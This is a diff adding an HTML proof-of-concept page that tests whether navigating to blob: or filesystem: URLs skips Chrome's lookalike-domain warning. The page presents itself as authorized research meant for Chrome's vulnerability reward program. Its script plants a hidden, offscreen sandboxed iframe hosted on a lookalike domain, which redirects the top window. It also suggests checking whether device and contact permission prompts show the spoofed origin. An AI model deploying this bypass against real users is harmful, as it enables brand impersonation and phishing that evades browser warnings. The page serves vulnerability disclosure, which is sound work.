@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lookalike Scheme-Bypass PoC (research)</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 16px/1.55 system-ui, sans-serif; margin: 0 auto; padding: 1.2rem; max-width: 680px; }
+  h1 { font-size: 1.3rem; } h2 { font-size: 1.05rem; margin-top: 1.6rem; }
+  .note { background: #8881; border-left: 3px solid #b3261e; padding: .6rem .8rem; border-radius: 6px; font-size: 13px; }
+  .card { border: 1px solid #8884; border-radius: 10px; padding: .9rem 1rem; margin: .8rem 0; }
+  .k { opacity: .65; font-size: 13px; text-transform: uppercase; letter-spacing: .04em; }
+  .v { font-size: 16px; font-weight: 700; word-break: break-all; }
+  code { background: #8882; padding: .1rem .35rem; border-radius: 4px; word-break: break-all; }
+  input, select { font: inherit; padding: .4rem; }
+  button { font: 600 16px system-ui; padding: .8rem 1rem; width: 100%; margin-top: .5rem; cursor: pointer; border-radius: 8px; }
+  pre { background: #8881; border-radius: 8px; padding: .7rem; white-space: pre-wrap; word-break: break-word; min-height: 2.5rem; font: 13px/1.5 ui-monospace, monospace; }
+</style>
+</head>
+<body>
+<h1>Lookalike Scheme-Bypass — Mechanism PoC</h1>
+<p class="note"><b>Authorized security research / responsible disclosure only.</b> This tests whether top-level navigation to
+<code>blob:</code> / <code>filesystem:</code> skips Chrome's lookalike (“Did you mean…”) throttle — a variant of issue 422217920.
+The rendered content is neutral by design. Use only domains you control; do not impersonate any brand; report findings to Chrome VRP.</p>
+
+<div class="card">
+  <div class="k">This page's origin</div>
+  <div class="v" id="origin">…</div>
+</div>
+
+<h2>1 — Direct scheme test (same-origin smoke test)</h2>
+<p style="font-size:14px">Navigates <b>this</b> window to a blob:/filesystem: page. Confirms the scheme works for top-nav and shows what the URL bar
+displays. No lookalike domain here (that's step 2) — this just proves the plumbing and lets you read the scheme's URL format. Press Back to return.</p>
+<div class="card">
+  <button data-act="blob">Top-nav this window → <code>blob:</code></button>
+  <button data-act="fs">Top-nav this window → <code>filesystem:</code></button>
+</div>
+
+<h2>2 — Cross-origin lookalike test (the real bypass)</h2>
+<p style="font-size:14px">Host <code>frame.html</code> + <code>common.js</code> on a <b>lookalike domain you own</b>, put that origin below, and embed it in a
+sandboxed iframe with <code>allow-top-navigation</code>. The iframe builds a blob:/filesystem: URL inheriting the lookalike origin and redirects
+the top window to it. If the landed page appears with the lookalike domain in the URL bar and <b>no warning</b>, the bypass works.</p>
+<div class="card">
+  <label style="display:block">Lookalike origin (where <code>frame.html</code> is hosted):
+    <input id="lkOrigin" style="width:100%;box-sizing:border-box;margin-top:.3rem" placeholder="https://accounts.g{ligature}ogle.example.com"></label>
+  <label style="display:block;margin-top:.6rem">Scheme:
+    <select id="lkScheme"><option value="blob">blob:</option><option value="filesystem">filesystem:</option></select></label>
+  <button data-act="embed">Embed sandboxed iframe → auto-redirect top</button>
+  <div id="frameHost"></div>
+</div>
+
+<h2>What to observe</h2>
+<ul style="font-size:14px">
+  <li><b>URL bar:</b> does it show the lookalike domain with no “Did you mean…” interstitial?</li>
+  <li><b>filesystem: vs blob::</b> does <code>filesystem:</code> top-nav succeed (sibling bypass), or is it blocked?</li>
+  <li><b>Prompt chain:</b> on the landed page, open the Contact/Bluetooth/USB chooser — does the dialog show the lookalike origin?</li>
+</ul>
+
+<h2>Log</h2>
+<pre id="log"></pre>
+
+<script src="common.js"></script>
+<script>
+  const $ = s => document.querySelector(s);
+  function log(m){ const t=new Date().toISOString().slice(11,23); $('#log').textContent = `[${t}] ${m}\n` + $('#log').textContent; }
+  $('#origin').textContent = location.origin;
+
+  document.addEventListener('click', (e) => {
+    const a = e.target.closest('[data-act]')?.dataset.act;
+    if (!a) return;
+    if (a === 'blob') { log('navigating this window to blob: …'); navViaBlob(window); }
+    else if (a === 'fs') { log('attempting filesystem: top-nav …'); navViaFilesystem(window, log); }
+    else if (a === 'embed') {
+      const origin = $('#lkOrigin').value.trim().replace(/\/+$/, '');
+      if (!origin) { log('enter the lookalike origin first'); return; }
+      const scheme = $('#lkScheme').value;
+      const src = origin + '/frame.html?scheme=' + scheme;
+      $('#frameHost').innerHTML = '';
+      const f = document.createElement('iframe');
+      f.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-top-navigation');
+      f.src = src;
+      f.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
+      $('#frameHost').appendChild(f);
+      log('embedded sandboxed iframe: ' + src + ' — it should redirect the top window.');
+    }
+  });
+</script>
+</body>
+</html>
